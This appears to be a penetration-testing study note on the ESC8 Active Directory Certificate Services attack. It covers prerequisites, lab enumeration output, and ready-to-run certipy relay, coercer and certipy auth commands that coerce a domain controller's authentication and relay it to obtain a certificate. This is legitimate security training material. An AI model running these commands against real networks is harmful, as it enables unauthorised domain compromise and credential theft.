## Overview
If an environment has AD CS installed, along with a vulnerable web enrollment endpoint and at least one certificate template published that allows for domain computer enrollment and client authentication (like the default Machine/Computer template), then an attacker can compromise ANY computer with the spooler service running!"; in brief, `ESC8` is "`NTLM Relay to AD CS HTTP Endpoints`". The idea behind the `ESC8` abuse is to coerce authentication from a machine account and relay it to `AD CS` to obtain a certificate that allows for client authentication; afterward, we abuse the certificate to forge a Silver Ticket. Therefore, if the `AD CS` is vulnerable to `ESC8`, we can compromise any computer in the domain from which we can coerce authentication.

The conditions for `ESC8` to be abused within an environment that uses `AD CS` are:
- We need computer other than the host computer of the target service that we want to relay to.
- A vulnerable web enrollment endpoint.
- At least one certificate template enabled allows domain computer enrollment and client authentication (like the default Machine/Computer template).

> [!NOTE] 
>  We can also use NTLM-Relay to compromise users.

> [!Danger] 
> before exploiting `ESC8`,`ESC11`. it is crucial to remember that in our testing-ground environment, `AD CS` should live in different host other than DC we are targeting, if its not, this configuration disallows us from conducting certain attacks, such as relaying a coerced `HTTP` `NTLM` authentication from the DC to a vulnerable web enrollment endpoint requesting the `DomainController` template, due to the `NTLM` `self-relay` attack being patched on almost all systems nowadays. Nevertheless, in real-world engagements, more than one DC will exist; therefore, carrying out `ESC8` or `ESC11` against them might be fruitful.

---
## Enumeration
#### Linux
```shell
Certificate Authorities
  0
    CA Name                             : lab-WS01-CA
    DNS Name                            : WS01.lab.local
    Certificate Subject                 : CN=lab-WS01-CA, DC=lab, DC=local
    Certificate Serial Number           : 238F549429FFF796430B5F486159490B
    Certificate Validity Start          : 2023-07-06 09:44:47+00:00
    Certificate Validity End            : 2122-07-06 09:54:47+00:00
    Web Enrollment                      : Enabled
_________
curl http://172.16.117.3/certsrv/certfnsh.asp
```

---
## Abuse
1. Using the `relay` option, we use Certipy to listen or wait for authentication via NTLM and then add two arguments: the target will be the CA or ADCS server, and then we add the template, which must correspond to the machine we are attacking. In this case, as the CA is not in the domain, we will attack the domain controller directly and therefore we have to use the `DomainController` template with the `-template <TemplateName>` option
2. In another console or shell, we use some available tools to coerce authentication against our target domain. We will use `coercer` with the option `coerce`. The arguments `-l` to specify the machine where we will be listening, we specify the target `-t 172.16.19.3` (the domain controller) and finally we pass the user and password with the options `-u` and `-p`, respectively. When `coercer` asks us for `Continue (C) | Skip this function (S) | Stop exploitation (X) ?` press `c` to continue with the attack and then `x` to stop exploitation.

```shell
sudo certipy relay -target 172.16.19.5 -template DomainController # or 
sudo certipy relay -target http://172.16.19.5 -template DomainController

coercer coerce -l 172.16.19.19 -t 172.16.19.3 -u blwasp -p 'Password123!' -d lab.local -v
# After getting the pfx file
certipy auth -pfx lab-dc.pfx
```